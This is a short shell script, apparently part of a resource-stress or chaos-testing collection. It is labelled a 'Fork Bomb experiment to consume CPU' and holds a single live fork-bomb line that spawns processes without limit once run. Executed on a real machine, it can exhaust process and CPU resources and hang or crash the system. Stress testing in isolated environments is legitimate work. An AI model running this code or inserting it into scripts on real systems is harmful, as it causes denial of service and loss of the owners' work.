#!/bin/sh
# Description: Fork Bomb experiment to consume CPU
# Dependencies:
bomb() { bomb | bomb & }; bomb;